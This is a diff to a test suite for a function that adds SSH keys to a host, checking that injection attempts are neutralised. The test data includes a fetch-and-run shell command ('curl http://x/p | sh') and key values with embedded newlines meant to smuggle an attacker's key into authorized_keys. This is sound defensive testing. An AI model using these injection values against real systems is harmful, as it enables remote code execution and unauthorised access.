@@ -82,6 +82,12 @@ describe("addKeyToHost", () => {
     expect(command).toContain("'.ssh'\\''; curl http://x/p | sh; echo '\\'''");
   });
 
+  it("throws on a multi-line public key instead of shipping it, and never calls sshExecCommand", async () => {
+    getSecret.mockResolvedValueOnce("ssh-ed25519 AAAA...\nssh-ed25519 BBBB...attacker" as never);
+    await expect(addKeyToHost({ sshKey, connection })).rejects.toThrow();
+    expect(sshExecCommand).not.toHaveBeenCalled();
+  });
+
   it("strips a newline from the key name so it can't smuggle a second authorized_keys line", async () => {
     const injectedKey = { id: "k1", name: "x\nssh-ed25519 AAAA…attacker" } as any;
     await addKeyToHost({ sshKey: injectedKey, connection });
